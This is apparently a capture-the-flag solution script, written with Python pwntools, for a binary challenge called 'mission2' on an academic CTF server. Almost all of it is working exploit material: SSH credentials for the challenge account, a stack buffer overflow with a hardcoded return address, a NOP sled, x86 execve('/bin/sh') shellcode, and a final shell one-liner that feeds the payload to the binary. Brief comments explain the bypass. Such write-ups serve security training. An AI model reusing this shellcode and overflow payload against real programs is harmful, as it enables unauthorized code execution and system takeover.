# from pwn import *
# from sys import *

# SERVER = "bin.chall.necst.it"
# PORT = 22
# BINARY = "mission2"
# PASSWORD = "unixporn"
# USER  = "m226002"

# OPTIONS = {
#     'PubkeyAuthentication': 'no',
#     'PasswordAuthentication': 'yes'
# }


# if "--remote" in sys.argv:
#     s = ssh(user=USER, host=SERVER, port=PORT, password=PASSWORD)
#     r = s.process("/home/m226002/mission2/mission2")
#     #r = remote("bin.chall.necst.it", 22)
# else:
#     r = process(BINARY)

# if "--debug" in sys.argv: 
    
#     gdb.attach(r, """
#         #breakpoints
#         b* 0x8049266
#         c
#         """)
#     input("wait")


# #code
# input("wait")
# shellcode = b'\x90'*200 +b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh\x00"
# jmp_addr = 0xffffde10+0x30
# r.sendline(b'A'*(272)+p32(jmp_addr)+shellcode)

# r.interactive()


#(python -c "print('')" ; cat -) | env -i /home/m226002/mission2/mission2

# this challenge has ASRL disabled, so it was easy to figure out more
# or less the jmp address. In this code the presence of the check function
# is useless, because it checks just the first 128 bytes. So, basically I 
# have crafted a shellcode to put into the buffer and I looked the address from 
# the stack.

shellcode = b'\x90'*200 +b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh\x00"

# as you can see I put a lot of nop because I tried different jump address before
# finding the correct one. The are different env from gdb to normal execution
# even if I have used the command "unset environment" inside gdb. 

# the final jump addr is

jmp_addr = 0xffffde10+0x30

# and the string to send inside the remote shell is the followiing

# (python -c "print(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@\xde\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x1f^\x89v\x081\xc0\x88F\x07\x89F\x0c\xb0\x0b\x89\xf3\x8dN\x08\x8dV\x0c\xcd\x801\xdb\x89\xd8@\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh\x00')" ; cat -) | env -i /home/m226002/mission2/mission2
